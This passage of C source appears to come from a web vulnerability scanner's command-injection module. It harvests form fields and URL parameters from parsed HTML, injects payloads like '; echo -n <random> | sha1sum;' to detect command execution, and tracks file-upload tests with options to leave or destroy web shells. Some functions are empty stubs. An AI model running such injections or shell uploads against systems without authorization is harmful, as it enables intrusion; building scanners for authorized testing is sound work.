		bpfree(md5);
		bpfree(string_to_md5);

		// increment the reflection test index
		reflection_test_idx++;

		// --- Test13: sha1 test with double semicolon --------------------------

		// set the pattern reflection test
		pattern_reflection_test = &pattern_reflection_tests[reflection_test_idx];

		// generate a random string to hash
		string_to_sha1 = BP_GenRandomASCIICharString
		(
				BP_GenRandomUnsignedLong(5,10),
				BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER
		);

		// generate a hash value to match
		sha1 = BP_GenSHA1(string_to_sha1, bpstrlen(string_to_sha1));

		// set the test
		string_joiner[0] = "; echo -n ";
		string_joiner[1] = string_to_sha1;
		string_joiner[2] = " | sha1sum;";

		// add the execution test
		pattern_reflection_test->execution_test = BP_JoinStringArray((char **) &string_joiner, 3, session->tq);

		// store the precomputed result
		pattern_reflection_test->precomputed_test_result = tq_strdup(session->tq, sha1, BPLN);

		// set the front part
		pattern_reflection_test->front_part = tq_strdup(session->tq, ";", BPLN);

		// set the back part
		pattern_reflection_test->back_part = tq_strdup(session->tq, ";", BPLN);


		// destroy the calculated sha1 string
		bpfree(sha1);
		bpfree(string_to_sha1);

		// increment the reflection test index
		reflection_test_idx++;



		// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
		// %%% Add Tests to Session Test Element Stack %%%%%%%%%%%%%%%%%%%
		// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

		// add file verification tests
		session->test_elements[test_element_idx].file_verification_tests  = file_verification_tests;
		session->test_elements[test_element_idx].file_verification_test_n = file_verification_test_idx;


		// add reflection tests
		session->test_elements[test_element_idx].pattern_reflection_tests  = pattern_reflection_tests;
		session->test_elements[test_element_idx].pattern_reflection_test_n = reflection_test_idx;

		// increment the test elements
		session->test_element_n++;

	}


	// return indicating success
	return ERR_SUCCESS;

}


// Adds a file verification test to an injection element.
BP_ERROR_T BP_CommandInjectionAddFileVerificationTestToInjectionElement
(
		P_BP_WEB_COMMAND_INJECTION_ELEMENT                    cmd_injection_element,
		P_BP_WEB_COMMAND_INJECTION_FILE_VERIFICATION_TEST file_verification_test
)
{

	// ensure we have a command injection element
	if(!cmd_injection_element)
		return ERR_FAILURE;

	// ensure we have a file verification test
	if(!file_verification_test)
		return ERR_FAILURE;




	// return indicating success
	return ERR_SUCCESS;

}

// Add a command reflection test to a test element.
BP_ERROR_T BP_CommandInjectionAddPatternReflectionTestToInjectionElement
(
		P_BP_WEB_COMMAND_INJECTION_ELEMENT cmd_injection_element,
		P_BP_WEB_COMMAND_INJECTION_PATTERN_REFLECTION_TEST pattern_reflection_test
)
{

	// ensure we have a command injection element
	if(!cmd_injection_element)
		return ERR_FAILURE;

	// if no pattern reflection tests, return indicating
	// failure.
	if(!pattern_reflection_test)
		return ERR_FAILURE;




	// return indicating success
	return ERR_SUCCESS;

}


// Generate default file verifidcation test sets.
BP_ERROR_T BP_CommandInjectionGenerateDefaultFileVerificationTests
(
		P_BP_WEB_COMMAND_INJECTION_ELEMENT cmd_injection_element
)
{

	// ensure we have a command injection element to append to
	if(!cmd_injection_element)
		return ERR_FAILURE;



	// return indicating success
	return ERR_SUCCESS;

}

// Generate default pattern reflection test sets.
BP_ERROR_T BP_CommandInjectionGenerateDefaultPatternReflectionTests
(
		P_BP_WEB_COMMAND_INJECTION_ELEMENT cmd_injection_element
)
{

	// ensure we have a command injection element to append to
	if(!cmd_injection_element)
		return ERR_FAILURE;



	// return indicating success
	return ERR_SUCCESS;

}



// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%% Target Generators, Parses HTML Extraction For Targets %%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


// This routine will parse a HTML extraction in order to generate new targets
// for the command injection subsystem.
BP_ERROR_T BP_CommandInjectionParseHtmlExtractionForNewTargets
(
		P_BP_WEB_COMMAND_INJECTION_TEST_SESSION cmd_injection_session,
		P_BP_HTML_FULL_EXTRACTION              html_extraction
)
{

	// ensure we have command injection sessions
	if(!cmd_injection_session)
		return ERR_FAILURE;

	// ensure we have a html extraction
	if(!html_extraction)
		return ERR_FAILURE;



	// parse html forms if they exist
	if(html_extraction->forms)
		BP_CommandInjectionParseHtmlFormsForNewTargets(cmd_injection_session, html_extraction->forms);

	// parse html anchors if they exist
	if(html_extraction->anchors)
		BP_CommandInjectionParseHtmlAnchorsForNewTargets(cmd_injection_session, html_extraction->anchors);




	// return indicating success
	return ERR_SUCCESS;

}

// Attempt to parse html forms for new targets.
BP_ERROR_T BP_CommandInjectionParseHtmlFormsForNewTargets
(
		P_BP_WEB_COMMAND_INJECTION_TEST_SESSION cmd_injection_session,
		P_BP_HTML_FORM_LIST                    forms
)
{

	// ensure we have sessions
	if(!cmd_injection_session)
		return ERR_FAILURE;

	// ensure we have forms to parse
	if(!forms)
		return ERR_FAILURE;

	// save first pointer
	P_BP_HTML_FORM_LIST form_saved_first = forms->first;

	// form input list used for iterating through forms
	P_BP_HTML_INPUT_LIST form_input_list = NULL;

	// the form test count
	size_t form_test_n = 0;

	// acquire test count
	for
	(
			forms = forms->first;
			forms;
			forms = forms->next
	)
	{

		// require inputs
		if(!forms->inputs)
			continue;


		// set form input list
		form_input_list = forms->inputs->first;

		// must have inputs to add elements
		if(!form_input_list)
			continue;

		// form must have properties (aka the name property)
		if(!form_input_list->properties)
			continue;

		// walk form input list
		for
		(
			;
			form_input_list;
			form_input_list = form_input_list->next
		)
		{

			// increase the form test count
			form_test_n++;

		}


	}


	// set inital index position
	size_t inital_index = 0;
	if(cmd_injection_session->cmd_injection_test_set_n)
		inital_index = cmd_injection_session->cmd_injection_test_set_n;

	// attempt to (re)allocate memory
	cmd_injection_session->cmd_injection_test_set = (P_BP_WEB_COMMAND_INJECTION_TEST) tq_realloc
	(
		cmd_injection_session->tq,
		cmd_injection_session->cmd_injection_test_set,
		sizeof(BP_WEB_COMMAND_INJECTION_TEST) * (form_test_n + cmd_injection_session->cmd_injection_test_set_n + 1),
		BPLN
	);

	// zero new memory
	memset
	(
		&cmd_injection_session->cmd_injection_test_set[inital_index],
		0x00,
		sizeof(BP_WEB_COMMAND_INJECTION_TEST) * form_test_n
	);

	// command injection test reference, here for adding code readability
	P_BP_WEB_COMMAND_INJECTION_TEST test = NULL;

	// acquire test count
	for
	(
			forms = form_saved_first;
			forms;
			forms = forms->next
	)
	{


		// require inputs
		if(!forms->inputs)
			continue;

		// set form input list
		form_input_list = forms->inputs->first;


		// must have inputs to add elements
		if(!form_input_list)
			continue;

		// must have properties
		if(!form_input_list->properties)
			continue;

		// walk form input list
		for
		(
			;
			form_input_list;
			form_input_list = form_input_list->next
		)
		{

			// -- Set Values ---------------------

			// set test at index
			test = &cmd_injection_session->cmd_injection_test_set[inital_index];

			// form test
			test->is_form_test = BP_TRUE;

			// set the form
			test->form       = forms;

			// set the form input
			test->form_input = form_input_list;

			// increment test set
			cmd_injection_session->cmd_injection_test_set_n++;

			// increase the form test count
			inital_index++;

		}


	}

	// return indicating success
	return ERR_SUCCESS;

}


// Attempt to parse html anchors for new targets.
BP_ERROR_T BP_CommandInjectionParseHtmlAnchorsForNewTargets
(
		P_BP_WEB_COMMAND_INJECTION_TEST_SESSION cmd_injection_session,
		P_BP_HTML_ANCHOR_LIST                  anchors
)
{

	// ensure we have command injection sessions
	if(!cmd_injection_session)
		return ERR_FAILURE;

	// ensure we have anchors
	if(!anchors)
		return ERR_FAILURE;


	// save first so we can iterate again
	P_BP_HTML_ANCHOR_LIST anchor_saved_first = anchors->first;

	// temporary anchor var list
	P_BP_HTML_ANCHOR_VAR_LIST anchor_var_list = NULL;

	// create reference to increase readable while iterating
	P_BP_HTML_ANCHOR_LIST anchor = anchors->first;

	// anchors
	size_t anchor_test_n = 0;

	// calculate the anchor count
	for
	(
		;
		anchor;
		anchor = anchor->next
	)
	{

		if(!anchor->vars)
			continue;

		// must have a parsed base or we can't work
		if(!anchor->base)
			continue;

		// set the var list for iterating
		anchor_var_list = anchor->vars;

		// count anchor variables
		for
		(
				;
				anchor_var_list;
				anchor_var_list = anchor_var_list->next
		)
		{
			// we have to have an anchor name, or we fail
			if(!bpstrlen(anchor_var_list->name))
				continue;


			// increment the anchor count
			anchor_test_n++;
		}

		/*
		printf("\n base:     %s", anchor->base);
		printf("\n path:     %s", anchor->path);
		printf("\n script:   %s", anchor->script);
		printf("\n host:     %s", anchor->host);
		printf("\n full_url: %s", anchor->full_url);
		printf("\n");
		*/

	}


	// set inital index position
	size_t inital_index = 0;
	if(cmd_injection_session->cmd_injection_test_set_n)
		inital_index = cmd_injection_session->cmd_injection_test_set_n;

	// attempt to (re)allocate memory
	cmd_injection_session->cmd_injection_test_set = (P_BP_WEB_COMMAND_INJECTION_TEST) tq_realloc
	(
		cmd_injection_session->tq,
		cmd_injection_session->cmd_injection_test_set,
		sizeof(BP_WEB_COMMAND_INJECTION_TEST) * (anchor_test_n + cmd_injection_session->cmd_injection_test_set_n+1),
		BPLN
	);

	// zero new memory
	memset
	(
		&cmd_injection_session->cmd_injection_test_set[inital_index],
		0x00,
		sizeof(BP_WEB_COMMAND_INJECTION_TEST) * anchor_test_n
	);

	// command injection test reference, here for adding code readability
	P_BP_WEB_COMMAND_INJECTION_TEST test = NULL;

	// copy in new values
	for
	(
		anchor = anchor_saved_first;
		anchor;
		anchor = anchor->next
	)
	{

		if(!anchor->vars)
			continue;

		// must have a parsed base or we can't work
		if(!anchor->base)
			continue;


		// set the var list for iterating
		anchor_var_list = anchor->vars->first;

		// count anchor variables
		for
		(
				;
				anchor_var_list;
				anchor_var_list = anchor_var_list->next
		)
		{


			// we have to have an anchor name, or we fail
			if(!bpstrlen(anchor_var_list->name))
				continue;

			// -- Set Values ---------------------

			// set test at index
			test = &cmd_injection_session->cmd_injection_test_set[inital_index];

			// mark test as an anchor test
			test->is_anchor_test = BP_TRUE;

			// set the anchor
			test->anchor        = anchor;

			// set the anchor var list
			test->anchor_var     = anchor_var_list;


			// -- Increment Counters --------------

			// move up the initial index
			inital_index++;

			// increase the number of injection sets here
			cmd_injection_session->cmd_injection_test_set_n++;

		}

	}

	// return indicating success
	return ERR_SUCCESS;

}



// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%% Test Visualizers %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

// Display the command injection session
BP_ERROR_T BP_CommandInjectionDisplaySession
(
		P_BP_WEB_COMMAND_INJECTION_TEST_SESSION cmd_injection_session,
		BP_BOOL display_cmd_injection_test_set,
		BP_BOOL display_anchor_tests,
		BP_BOOL display_form_tests,
		BP_BOOL display_test_elements
)
{

	// ensure we have a command injection session
	if(!cmd_injection_session)
		return ERR_FAILURE;

	printf("\n [+] Command Injection Session: (%p)", cmd_injection_session);
	printf("\n");
	printf("\n     tq:                                        %p", cmd_injection_session->tq);
	printf("\n     assessment_reference:                      %p", cmd_injection_session->assessment_reference);
	printf("\n     html_extraction_reference:                 %p", cmd_injection_session->html_extraction_reference);
	printf("\n     php_gadget_library:                        %p", cmd_injection_session->php_gadget_library);
	printf("\n     cmd_injection_test_set:                    %p", cmd_injection_session->cmd_injection_test_set);
	printf("\n     cmd_injection_test_set_n:                  %zu", cmd_injection_session->cmd_injection_test_set_n);
	printf("\n     total_command_injection_points_discovered: %zu", cmd_injection_session->total_command_injection_points_discovered);
	printf("\n     total_anchor_tests_in_test_set:            %zu", cmd_injection_session->total_anchor_tests_in_test_set);
	printf("\n     total_form_tests_in_test_set:              %zu", cmd_injection_session->total_form_tests_in_test_set);
	printf("\n     total_anchor_tests_in_test_set:            %zu", cmd_injection_session->total_anchor_tests_in_test_set);
	printf("\n     test_elements:                             %p", cmd_injection_session->test_elements);
	printf("\n     test_element_n:                            %u", cmd_injection_session->test_element_n);
	printf("\n     stop_cmd_injection_test_after_code_execution_discovered: %s", cmd_injection_session->stop_cmd_injection_test_after_code_execution_discovered ? "Yes":"No");
	printf("\n");




	// display test elements
	if(display_test_elements)
	{
		BP_CommandInjectionDisplayTestElements
		(
				cmd_injection_session
		);
	}

	// display command injection test set if desired
	if(display_cmd_injection_test_set)
	{

		BP_CommandInjectionDisplayTestSets
		(
				cmd_injection_session,
				display_anchor_tests,
				display_form_tests
		);

	}


	// return indicating success
	return ERR_SUCCESS;

}

// Display test sets
BP_ERROR_T BP_CommandInjectionDisplayTestSets
(
		P_BP_WEB_COMMAND_INJECTION_TEST_SESSION cmd_injection_session,
		BP_BOOL display_anchor_tests,
		BP_BOOL display_form_tests
)
{

	// ensure we have a command injection session
	if(!cmd_injection_session)
		return ERR_FAILURE;

	// ensure we have test to display
	if(!cmd_injection_session->cmd_injection_test_set)
		return ERR_FAILURE;

	// used for iterating through tests
	size_t test_iter = 0;

	printf("\n");
	printf("\n\t\t\t [+] Command Test Sets (Anchors/Forms/Etc): (%p)", cmd_injection_session->cmd_injection_test_set);
	printf("\n\t\t\t     cmd_injection_test_set_n: %zu", cmd_injection_session->cmd_injection_test_set_n);
	printf("\n");



	// walk all command injection tests
	for
	(
		;
		test_iter < cmd_injection_session->cmd_injection_test_set_n;
		test_iter++
	)
	{


		// display anchor test
		if((display_anchor_tests == BP_TRUE) && (cmd_injection_session->cmd_injection_test_set[test_iter].is_anchor_test == BP_TRUE))
		BP_CommandInjectionDisplayTestSet
		(
				&cmd_injection_session->cmd_injection_test_set[test_iter]
		);

		// display form test
		if((display_form_tests == BP_TRUE) && (cmd_injection_session->cmd_injection_test_set[test_iter].is_form_test == BP_TRUE))
		BP_CommandInjectionDisplayTestSet
		(
				&cmd_injection_session->cmd_injection_test_set[test_iter]
		);


	}


	// return indicating success
	return ERR_SUCCESS;

}

// Display the test set
BP_ERROR_T BP_CommandInjectionDisplayTestSet
(
		P_BP_WEB_COMMAND_INJECTION_TEST cmd_injection_test_set
)
{

	// ensure we have a test set to display
	if(!cmd_injection_test_set)
		return ERR_FAILURE;

	printf("\n");
	printf("\n\t\t\t\t [-] Injection Test:                         (%p)", cmd_injection_test_set);
	printf("\n\t\t\t\t     tests_completed:                         %s", cmd_injection_test_set->tests_completed ? "Yes" : "No");
	printf("\n\t\t\t\t     testing_reported_vulnerable_condition:   %s", cmd_injection_test_set->testing_reported_vulnerable_condition ? "Yes" : "No");
	printf("\n\t\t\t\t     is_anchor_test:                          %s", cmd_injection_test_set->is_anchor_test ? "Yes" : "No");
	printf("\n\t\t\t\t     is_form_test:                            %s", cmd_injection_test_set->is_form_test ? "Yes" : "No");

	if(cmd_injection_test_set->anchor)
	{
		printf("\n\t\t\t\t     anchor:                                  %p - %s", cmd_injection_test_set->anchor, cmd_injection_test_set->anchor->full_url);
		printf("\n\t\t\t\t     anchor_var:                              %p - %s", cmd_injection_test_set->anchor_var, cmd_injection_test_set->anchor_var->name);
	}
	if(cmd_injection_test_set->form)
	{

		// attempt to get name property
		P_BP_HTML_INPUT_PROPERTY_LIST prop = HTMLGetInputPropertyByNameI(cmd_injection_test_set->form_input->properties, "name");
		printf("\n\t\t\t\t     form:                                    %p - %s", cmd_injection_test_set->form,       cmd_injection_test_set->form->full_url);
		printf("\n\t\t\t\t     form_input:                              %p - %s", cmd_injection_test_set->form_input, prop ? prop->content : "BAD_VAL");
	}
	printf("\n");
	// display the number of vulnerable file upload tests
	printf("\n\t\t\t\t     file_verification_tests_found_vulnerable_n:   %zu", cmd_injection_test_set->file_verification_tests_found_vulnerable_n);

	// display the individual index
	size_t n = 0;
	for(; n < cmd_injection_test_set->file_verification_tests_found_vulnerable_n; n++)
	{
		printf("\n\t\t\t\t\t          file_test_idx: %zu", cmd_injection_test_set->file_verification_tests_found_vulnerable[n]);
	}



	// display the number of vulnerable file upload tests
	printf("\n\t\t\t\t     pattern_reflection_tests_found_vulnerable_n:  %zu", cmd_injection_test_set->pattern_reflection_tests_found_vulnerable_n);

	// display the individual index
	for(n = 0; n < cmd_injection_test_set->pattern_reflection_tests_found_vulnerable_n; n++)
	{
		printf("\n\t\t\t\t\t          reflection_test_idx: %zu", cmd_injection_test_set->pattern_reflection_tests_found_vulnerable[n]);
	}



	printf("\n");

	// return indicating success
	return ERR_SUCCESS;

}


// Display injection session elements.
BP_ERROR_T BP_CommandInjectionDisplayTestElements
(
		P_BP_WEB_COMMAND_INJECTION_TEST_SESSION cmd_injection_session
)
{

	// exit if we have no injection session
	if(!cmd_injection_session)
		return ERR_FAILURE;

	if(!cmd_injection_session->test_elements)
		return ERR_FAILURE;

	printf("\n\t [+] Displaying Command Injection Elements: (sess: %p)(elem: %p)", cmd_injection_session, cmd_injection_session->test_elements);
	printf("\n\t     test_element_n:   %zu", cmd_injection_session->test_element_n);

	// set index iterator
	size_t index_iter = 0;

	// init the element (set on loop)
	P_BP_WEB_COMMAND_INJECTION_ELEMENT elem = NULL;

	// Display each index as they're encountered
	for
	(
			;
			index_iter < cmd_injection_session->test_element_n;
			index_iter++
	)
	{


		// set the element to work with on loop iteration
		elem = &cmd_injection_session->test_elements[index_iter];

		// test elements
		printf("\n\t\t\t [+: %zu] Test Element\n", index_iter);

		// set iterators for both element types
		size_t pattern_reflect_test_iter   = 0;
		size_t file_verification_test_iter = 0;

		// display all the pattern reflection tests
		for
		(
				;
				pattern_reflect_test_iter < elem->pattern_reflection_test_n;
				pattern_reflect_test_iter++
		)
		{

			// display the reflection tests
			BP_CommandInjectionDisplayReflectionTest(&elem->pattern_reflection_tests[pattern_reflect_test_iter]);

		}


		// display all the file verification tests
		for
		(
				;
				file_verification_test_iter < elem->file_verification_test_n;
				file_verification_test_iter++
		)
		{

			// display the reflection tests
			BP_CommandInjectionDisplayFileVerificationTest(&elem->file_verification_tests[file_verification_test_iter]);

		}

	}


	// return indicating success
	return ERR_SUCCESS;

}

// Display a single reflection test
BP_ERROR_T BP_CommandInjectionDisplayReflectionTest(P_BP_WEB_COMMAND_INJECTION_PATTERN_REFLECTION_TEST test)
{

	// ensure we have a test
	if(!test)
		return ERR_FAILURE;

	// display the test
	printf("\n\t\t\t\t [+] Reflection Test");
	printf("\n\t\t\t\t     execution_test:           %s", test->execution_test);
	printf("\n\t\t\t\t     precomputed_test_result:  %s", test->precomputed_test_result);
	printf("\n");

	// return indicating success
	return ERR_SUCCESS;

}

// Display a single file verification test
BP_ERROR_T BP_CommandInjectionDisplayFileVerificationTest(P_BP_WEB_COMMAND_INJECTION_FILE_VERIFICATION_TEST test)
{

	// ensure we have a test
	if(!test)
		return ERR_FAILURE;

	// display the test
	printf("\n\t\t\t\t [+] File Upload/Creation Test");
	printf("\n\t\t\t\t     programming_language_for_file_upload: ");

	switch(test->programming_language_for_file_upload)
	{

		case BP_WEB_COMMAND_INJECTION_FILE_PROGRAMMING_LANGUAGE_NONE:
			printf("BP_WEB_COMMAND_INJECTION_FILE_PROGRAMMING_LANGUAGE_NONE");
			break;
		case BP_WEB_COMMAND_INJECTION_FILE_PROGRAMMING_LANGUAGE_PHP:
			printf("BP_WEB_COMMAND_INJECTION_FILE_PROGRAMMING_LANGUAGE_PHP");
			break;
		case BP_WEB_COMMAND_INJECTION_FILE_PROGRAMMING_LANGUAGE_ASP:
			printf("BP_WEB_COMMAND_INJECTION_FILE_PROGRAMMING_LANGUAGE_ASP");
			break;
		case BP_WEB_COMMAND_INJECTION_FILE_PROGRAMMING_LANGUAGE_JSP:
			printf("BP_WEB_COMMAND_INJECTION_FILE_PROGRAMMING_LANGUAGE_JSP");
			break;
		case BP_WEB_COMMAND_INJECTION_FILE_PROGRAMMING_LANGUAGE_CFM:
			printf("BP_WEB_COMMAND_INJECTION_FILE_PROGRAMMING_LANGUAGE_CFM");
			break;
		case BP_WEB_COMMAND_INJECTION_FILE_PROGRAMMING_LANGUAGE_DNET:
			printf("BP_WEB_COMMAND_INJECTION_FILE_PROGRAMMING_LANGUAGE_DNET");
			break;
		default:
			printf("BAD_VAL");
			break;

	}


	printf("\n\t\t\t\t     verification_path_type:               ");

	switch(test->verification_path_type)
	{
		case BP_WEB_COMMAND_INJECTION_FILE_CHECK_NONE:
			printf("BP_WEB_COMMAND_INJECTION_FILE_CHECK_NONE");
			break;
		case BP_WEB_COMMAND_INJECTION_FILE_CHECK_RELATIVE_PATH:
			printf("BP_WEB_COMMAND_INJECTION_FILE_CHECK_RELATIVE_PATH");
			break;
		case BP_WEB_COMMAND_INJECTION_FILE_CHECK_ABSOLUTE_PATH:
			printf("BP_WEB_COMMAND_INJECTION_FILE_CHECK_ABSOLUTE_PATH");
			break;
		default:
			printf("BAD_VAL");
			break;
	}

	printf("\n\t\t\t\t     cleanup_indicator:                    ");

	switch(test->cleanup_indicator)
	{

		case BP_WEB_COMMAND_INJECTION_FILE_CLEANUP_NONE:
			printf("BP_WEB_COMMAND_INJECTION_FILE_CLEANUP_NONE");
			break;
		case BP_WEB_COMMAND_INJECTION_FILE_CLEANUP_LEAVE_SHELL:
			printf("BP_WEB_COMMAND_INJECTION_FILE_CLEANUP_LEAVE_SHELL");
			break;
		case BP_WEB_COMMAND_INJECTION_FILE_CLEANUP_DESTROY_SHELL:
			printf("BP_WEB_COMMAND_INJECTION_FILE_CLEANUP_DESTROY_SHELL");
			break;
		default:
			printf("BAD_VAL");
			break;

	}

	printf("\n\t\t\t\t     upload_file_name: %s", test->upload_file_name);
	printf("\n\t\t\t\t     upload_file_path: %s", test->upload_file_path);
	printf("\n\t\t\t\t     upload_file_body: %s", test->upload_file_body);
	printf("\n\t\t\t\t     front_part:       %s", test->front_part);
	printf("\n\t\t\t\t     back_part:        %s", test->back_part);
	printf("\n");


	// return indicating success
	return ERR_SUCCESS;

}

// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%% Injection Test Dispatchers (Run Tests) %%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

// This routine will attempt to run all command injection tests which are not
// marked as disabled.  Tests are run in parallel based on the provided thread
// count.
BP_ERROR_T BP_CommandInjectionRunTests(P_BP_WEB_COMMAND_INJECTION_TEST_SESSION cmd_injection_session, size_t thread_count)
{

	// ensure we have a valid session
	if(!cmd_injection_session)
		return ERR_FAILURE;


	// allocate space for parameters
	P_BP_WEB_COMMAND_INJECTION_THREAD_PARAMETERS parameters = (P_BP_WEB_COMMAND_INJECTION_THREAD_PARAMETERS) tq_calloc
	(
			cmd_injection_session->tq,
			cmd_injection_session->cmd_injection_test_set_n * sizeof(BP_WEB_COMMAND_INJECTION_THREAD_PARAMETERS),
			1,
			BPLN
	);

	// set all the tests
	size_t test_iter = 0;
	for
	(
			;
			test_iter < cmd_injection_session->cmd_injection_test_set_n;
			test_iter++
	)
	{

		// set the session
		parameters[test_iter].cmd_injection_session = cmd_injection_session;


		// set the test
		parameters[test_iter].test = &cmd_injection_session->cmd_injection_test_set[test_iter];

	}

	// parameters must be passed as voids
	void ** parms_as_voids = (void **) tq_calloc
	(
			cmd_injection_session->tq,
			sizeof(void *) * cmd_injection_session->cmd_injection_test_set_n,
			1,
			BPLN
	);
	for
	(
			test_iter = 0;
			test_iter < cmd_injection_session->cmd_injection_test_set_n;
			test_iter++
	)
	{

		// set the session
		parms_as_voids[test_iter] = (void *) &parameters[test_iter];

	}

	// set argument lengths
	size_t * arg_lens = (size_t *) tq_calloc
	(
			cmd_injection_session->tq,
			cmd_injection_session->cmd_injection_test_set_n * sizeof(size_t),
			1,
			BPLN
	);

	size_t size_iter = 0;
	for
	(
			;
			size_iter < cmd_injection_session->cmd_injection_test_set_n;
			size_iter++
	)
	{
		arg_lens[size_iter] = sizeof(void *);
	}

	// create a new thread manager to run results with
	P_BP_THREAD_MANAGER thread_mgr = BP_CreateThreadManager("command injection assessment mgr", "runs command injection tests");


	size_t thread_iter = 0;
	for
	(
			;
			thread_iter < thread_count;
			thread_iter++
	)
	{

		// add threads
		BP_CreateThread
		(
			thread_mgr,
			BP_CommandInjectionRunTest_thinit,
			NULL,
			0,
			BP_FALSE
		);

	}

	// run the tests
	BP_ThreadedDataProcessor
	(
			thread_mgr,
			(void **) parms_as_voids,
			arg_lens,
			cmd_injection_session->cmd_injection_test_set_n-1
	);


	// destroy the thread manager
	BP_DestroyThreadManager(thread_mgr);

	// return indicating success
	return ERR_SUCCESS;

}

// Attempt to lock assessment semaphore.
BP_ERROR_T BP_CommandInjectionLockAssessment(P_BP_WEB_COMMAND_INJECTION_TEST_SESSION cmd_injection_session)
{

	if(!cmd_injection_session)
		return ERR_FAILURE;

	// wait on the semaphore
	sem_wait(&cmd_injection_session->lock);

	// return indicating success
	return ERR_SUCCESS;

}

// Attempt to unlock assessment semaphore.
BP_ERROR_T BP_CommandInjectionUnlockAssessment(P_BP_WEB_COMMAND_INJECTION_TEST_SESSION cmd_injection_session)
{

	// ensure we have a session to work with
	if(!cmd_injection_session)
		return ERR_FAILURE;

	// unlock semaphore
	sem_post(&cmd_injection_session->lock);

	// return indicating success
	return ERR_SUCCESS;

}


// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%% Generates Final Test Send Data %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

// generates command injection requests from element sets
P_BP_WEB_COMMAND_INJECTION_HTTP_REQUEST_INFO BP_CommandInjectionGenerateHTTPRequests
(
		P_BP_WEB_COMMAND_INJECTION_TEST_SESSION cmd_injection_session,
		P_BP_WEB_COMMAND_INJECTION_TEST         test,
		P_BP_WEB_COMMAND_INJECTION_ELEMENT      element
)
{

	// check parameters and ensure they exist
	if(!test)
		return NULL;
	if(!element)
		return NULL;

	// allocate request info structure
	P_BP_WEB_COMMAND_INJECTION_HTTP_REQUEST_INFO request_info = (P_BP_WEB_COMMAND_INJECTION_HTTP_REQUEST_INFO) tq_calloc
	(
			cmd_injection_session->tq,
			sizeof(BP_WEB_COMMAND_INJECTION_HTTP_REQUEST_INFO),
			1,
			BPLN
	);

	// set the total requests
	size_t total_requests = 0;



	// increase the request count by the number of tests we have to submit
	total_requests += element->file_verification_test_n;
	total_requests += element->pattern_reflection_test_n;

	// set the total requests
	request_info->request_n = total_requests;

	// allocate space for requests
	request_info->generated_requests = (P_BP_WEB_COMMAND_INJECTION_HTTP_REQUEST) tq_calloc
	(
			cmd_injection_session->tq,
			sizeof(BP_WEB_COMMAND_INJECTION_HTTP_REQUEST) * total_requests,
			1,
			BPLN
	);


	// request iterator
	size_t request_iter = 0;

	// placeholder for the current request
	P_BP_WEB_COMMAND_INJECTION_HTTP_REQUEST current_request = NULL;

	// generate anchor requests if it's an anchor test
	if(test->is_anchor_test)
	{

		// reflection test iterator
		size_t reflection_test_iter = 0;

		// generate reflection tests
		for
		(
				;
				reflection_test_iter < element->pattern_reflection_test_n;
				reflection_test_iter++
		)
		{


			// set current request
			current_request = &request_info->generated_requests[request_iter];

			// number of anchor vars in the list
			size_t anchor_var_n = HTMLGetAnchorVarCount(test->anchor_var->first);

			// allocate space for all items
			char ** joiner = (char **) bpcalloc(sizeof(char*) * ((anchor_var_n * 4) + 1), 1);

			// set anchor reference
			P_BP_HTML_ANCHOR_LIST anchor = test->anchor;

			// set anchor var reference
			P_BP_HTML_ANCHOR_VAR_LIST anchor_var = test->anchor_var;
			if(!anchor_var)
				continue;

			// set joiner iter
			size_t joiner_iter = 0;

			// add parameter index
			joiner[joiner_iter] = "?";
			joiner_iter++;

			// walk var list
			for
			(
					anchor_var = anchor_var->first;
					anchor_var;
					anchor_var = anchor_var->next
			)
			{

				// ensure we have a var name
				if(!anchor_var->name)
					continue;

				// check anchor var here
				if(anchor_var == test->anchor_var)
				{

					joiner[joiner_iter] = anchor_var->name;
					joiner_iter++;
					joiner[joiner_iter] = "=";
					joiner_iter++;
					joiner[joiner_iter] = BP_UTF8StringEncode(element->pattern_reflection_tests[reflection_test_iter].execution_test, bpstrlen(element->pattern_reflection_tests[reflection_test_iter].execution_test), cmd_injection_session->tq);
					joiner_iter++;

					// add ampersand if we have a next position
					if(anchor_var->next)
					{
						joiner[joiner_iter] = "&";
						joiner_iter++;
					}
				}
				else
				{

					// always add the var name
					joiner[joiner_iter] = anchor_var->name;
					joiner_iter++;

					// only add content if it exists
					if(joiner[joiner_iter] = anchor_var->content)
					{
						joiner[joiner_iter] = "=";
						joiner_iter++;
						joiner[joiner_iter] = anchor_var->content;
						joiner_iter++;
					}

					// add ampersand if we have a next position
					if(anchor_var->next)
					{
						joiner[joiner_iter] = "&";
						joiner_iter++;
					}

				}

			}

			// declare join string
			char * join_string = NULL;

			if(joiner_iter > 1)
				join_string = BP_JoinStringArray((char **) joiner, joiner_iter);

			// create final joiner
			char * final_joiner[3];
			BP_ZERO_STACK(final_joiner);

			// set full url to join with composite test
			final_joiner[0] = anchor->script;
			final_joiner[1] = join_string;

			// generate final string
			char * final_joiner_str = BP_JoinStringArray((char **) &final_joiner, 2);

			// set the get string
			current_request->get_str = tq_strdup(cmd_injection_session->tq, final_joiner_str, BPLN);

			// set reference to reflection test
			current_request->pattern_reflection_test_ref   = &element->pattern_reflection_tests[reflection_test_iter];
			current_request->pattern_reflection_test_index = reflection_test_iter;
